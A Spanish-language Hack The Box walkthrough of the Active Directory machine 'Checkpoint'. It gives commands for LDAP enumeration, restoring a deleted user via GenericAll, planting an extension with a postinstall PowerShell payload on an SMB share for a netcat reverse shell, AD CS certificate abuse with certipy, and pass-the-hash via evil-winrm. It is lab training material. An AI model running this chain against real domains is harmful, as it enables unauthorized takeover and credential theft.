HTB — Checkpoint

📅 16/06/2026 · ⏱️ 2 min de lectura · 🎯 Dificultad: Medium
HTBActive DirectoryWindowsAD CSSMBVSIX exploit

Checkpoint es una máquina Active Directory que combina enumeración LDAP, abuso de permisos delegados, SMB y una escalada final mediante Active Directory Certificate Services (AD CS). Durante la resolución aprovecharemos permisos excesivos sobre un usuario eliminado para recuperar acceso a una cuenta privilegiada y posteriormente comprometer todo el dominio.

Reconocimiento

Comencé realizando un escaneo completo de puertos:

nmap -p- --min-rate 5000 10.129.16.196 -oN init.nmap

Posteriormente ejecuté detección de servicios y scripts NSE:

nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.129.16.196 -oN
services.nmap

Los resultados muestran claramente que nos encontramos frente a un Domain Controller.

53/tcp open dns 88/tcp open kerberos 389/tcp open ldap 445/tcp open microsoft-ds 5985/
tcp open winrm 9389/tcp open adws

Hallazgo: la máquina expone múltiples servicios de Active Directory, incluyendo LDAP, Kerberos, SMB y WinRM.

Enumeración LDAP

La máquina proporciona las siguientes credenciales iniciales:

alex.turner : Checkpoint2024!

Con ellas realizamos una enumeración completa del dominio mediante ldapdomaindump.

ldapdomaindump
-u checkpoint.local\alex.turner
-p 'Checkpoint2024!'
ldap://10.129.16.196

Tras revisar los objetos del dominio y sus ACLs encontramos un hallazgo muy interesante.

Hallazgo: el usuario alex.turner posee permisos GenericAll sobre el usuario ryan.brooks.

Al continuar revisando la información exportada observamos que ryan.brooks se encuentra eliminado dentro de Active Directory.

Dado que contamos con permisos GenericAll sobre dicho objeto, procedemos a restaurar la cuenta y asignarle una nueva contraseña.

Una vez recuperada la cuenta validamos el acceso al dominio utilizando las nuevas credenciales.

Enumeración SMB

Con la cuenta restaurada comenzamos la enumeración de recursos compartidos.

smbclient -L //10.129.16.196 -U ryan.brooks

Entre los recursos disponibles encontramos uno particularmente interesante:

DevDrop

Accedemos al recurso:

smbclient //10.129.16.196/DevDrop -U ryan.brooks

Tras revisar los archivos presentes observamos documentación y configuraciones relacionadas con un sistema automatizado de despliegue de extensiones.

Hallazgo: la cuenta ryan.brooks posee permisos de escritura sobre DevDrop.

El servicio monitoriza continuamente nuevos paquetes, los extrae y ejecuta procesos de instalación automáticamente.

Obtención del Acceso Inicial

Analizando el mecanismo de despliegue descubrimos que las extensiones son simplemente archivos comprimidos que pueden incluir scripts de instalación.

Uno de los eventos soportados es: 

"postinstall"

Esto nos permite ejecutar comandos arbitrarios cuando el sistema procesa la extensión.

Creamos una extensión maliciosa:


    { 
        "name": "checkpoint",
        "version": "1.0.0",
        "scripts": { "postinstall": "powershell -c <payload>" 
    } }

Empaquetamos el contenido:

zip -r exploit.zip .

Preparamos un listener:

nc -lvnp 4444

Y subimos la extensión al recurso compartido:

put exploit.extension

Tras unos segundos el proceso automatizado detecta el paquete, ejecuta el script de instalación y obtenemos una shell sobre el controlador de dominio. 

type C:\Users\ryan.brooks\Desktop\user.txt

Escalada de Privilegios

Con acceso inicial procedemos a enumerar el entorno Active Directory utilizando BloodHound y Certipy. 

certipy find
-u ryan.brooks
-p '<PASSWORD>'
-d checkpoint.local

La enumeración revela una plantilla vulnerable dentro de Active Directory Certificate Services.

La plantilla permite especificar Subject Alternative Name (SAN), posibilitando solicitar certificados para cualquier usuario del dominio.

Abuso de AD CS

Solicitamos un certificado para la cuenta Administrator. 

certipy req
-u ryan.brooks
-p '<PASSWORD>'
-template <TEMPLATE>
-upn administrator@checkpoint.local

Como resultado obtenemos:

administrator.pfx

Posteriormente utilizamos dicho certificado para autenticarnos y recuperar el hash NTLM del administrador. 

certipy auth -pfx administrator.pfx

Con el hash en nuestro poder realizamos Pass-the-Hash utilizando Evil-WinRM. 

evil-winrm
-i 10.129.16.196
-u Administrator
-H <NTLM_HASH>

Compromiso Total

La autenticación es exitosa y obtenemos privilegios de Domain Administrator sobre el controlador de dominio. 

type C:\Users\max.palmer\Desktop\root.txt

Pwned: compromiso completo del dominio mediante restauración de usuario eliminado, abuso de SMB y explotación de AD CS.

Conclusión

Checkpoint demuestra cómo una mala delegación de permisos en Active Directory puede terminar comprometiendo por completo una organización. La cadena de explotación se basa en la recuperación del usuario eliminado ryan.brooks gracias a permisos GenericAll de alex.turner, el abuso del recurso compartido DevDrop para conseguir ejecución remota de código y finalmente una escalada crítica mediante una plantilla vulnerable de Active Directory Certificate Services.
